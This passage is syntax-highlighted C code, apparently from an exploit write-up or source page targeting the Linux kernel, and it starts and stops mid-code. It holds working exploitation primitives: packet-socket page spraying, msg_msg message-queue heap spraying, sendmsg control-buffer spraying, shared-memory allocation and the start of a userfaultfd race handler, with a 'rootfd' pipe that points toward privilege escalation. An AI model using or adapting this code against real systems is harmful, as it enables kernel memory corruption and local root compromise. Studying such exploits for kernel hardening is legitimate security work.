</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">tpacket_req3</span> <span class="n">req</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_block_size</span> <span class="o">=</span> <span class="n">block_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_frame_size</span> <span class="o">=</span> <span class="n">frame_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_block_nr</span> <span class="o">=</span> <span class="n">block_nr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_frame_nr</span> <span class="o">=</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">*</span> <span class="n">block_nr</span><span class="p">)</span> <span class="o">/</span> <span class="n">frame_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_retire_blk_tov</span> <span class="o">=</span> <span class="n">timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_sizeof_priv</span> <span class="o">=</span> <span class="n">sizeof_priv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">.</span><span class="n">tp_feature_req_word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">rv</span> <span class="o">=</span> <span class="nf">setsockopt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_RX_RING</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;setsockopt(PACKET_RX_RING): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">packet_socket_setup</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_size</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">frame_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_nr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sizeof_priv</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_PACKET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="nf">htons</span><span class="p">(</span><span class="n">ETH_P_ALL</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;socket(AF_PACKET): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">packet_socket_rx_ring_init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">frame_size</span><span class="p">,</span> <span class="n">block_nr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="n">sizeof_priv</span><span class="p">,</span> <span class="n">timeout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sockaddr_ll</span> <span class="n">sa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_family</span> <span class="o">=</span> <span class="n">PF_PACKET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_protocol</span> <span class="o">=</span> <span class="nf">htons</span><span class="p">(</span><span class="n">ETH_P_ALL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_ifindex</span> <span class="o">=</span> <span class="nf">if_nametoindex</span><span class="p">(</span><span class="s">&#34;lo&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_hatype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_pkttype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">.</span><span class="n">sll_halen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">rv</span> <span class="o">=</span> <span class="nf">bind</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;bind(AF_PACKET): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">packet_socket_setup</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">poll_list</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">poll_list</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">entries</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ISO_SLAB_LIMIT 8
</span></span></span><span class="line"><span class="cl"><span class="cp">#define INITIAL_PAGE_SPRAY 500
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">typedef</span> <span class="k">struct</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">in_use</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">idx</span><span class="p">[</span><span class="n">ISO_SLAB_LIMIT</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">full_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">enum</span> <span class="n">spray_cmd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ALLOC_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">FREE_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">EXIT_SPRAY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">shmid</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">shmaddr</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">rootfd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sprayfd_child</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sprayfd_parent</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">msg_msg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_list_next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_list_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">msg_msgseg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="mh">0x4000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">msgbuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">msgqid</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">pthread_mutex_t</span> <span class="n">mutex</span> <span class="o">=</span> <span class="n">PTHREAD_MUTEX_INITIALIZER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">msgsnd</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgsnd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">alloc_shm</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">shmget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0600</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] shmget fail&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">shmaddr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SHM_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">shmaddr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] shmat&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define MSG_COPY 040000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define IPC_NOWAIT 04000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">show_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">,</span><span class="kt">long</span> <span class="n">msgtyp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="n">msgtyp</span><span class="p">,</span> <span class="n">MSG_COPY</span> <span class="o">|</span> <span class="n">IPC_NOWAIT</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgrcv&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">free_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">,</span> <span class="kt">long</span> <span class="n">msgtyp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="n">msgtyp</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgrcv&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">msg_get</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mo">0666</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;msgget&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">build_msg_msg</span><span class="p">(</span><span class="k">struct</span> <span class="n">msg_msg</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">m_list_next</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="kt">uint64_t</span> <span class="n">m_list_prev</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">m_type</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">m_ts</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_list_next</span> <span class="o">=</span> <span class="n">m_list_next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_list_prev</span> <span class="o">=</span> <span class="n">m_list_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_type</span> <span class="o">=</span> <span class="n">m_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_ts</span> <span class="o">=</span> <span class="n">m_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">security</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">build_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">num</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">num</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="n">msgqid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">msg_get</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_sendmsg</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span><span class="kt">int</span> <span class="n">count</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// char buf[size];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msgh</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="n">INADDR_LOOPBACK</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="nf">htons</span><span class="p">(</span><span class="mi">6666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgh</span><span class="p">.</span><span class="n">msg_control</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgh</span><span class="p">.</span><span class="n">msg_controllen</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgh</span><span class="p">.</span><span class="n">msg_name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">caddr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgh</span><span class="p">.</span><span class="n">msg_namelen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sendmsg</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msgh</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">errExit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nf">puts</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">userfault_handler</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">uffd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nready</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pollfd</span><span class="p">.</span><span class="n">fd</span>     <span class="o">=</span> <span class="n">uffd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pollfd</span><span class="p">.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">nready</span> <span class="o">=</span> <span class="nf">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// TODO
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">nready</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-] Wrong pool return value&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">nready</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">nready</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-]msg error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">page</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-]mmap page error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">uc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">page</span><span class="p">));</span><span class="c1">//copy_from_user use this page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">page</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
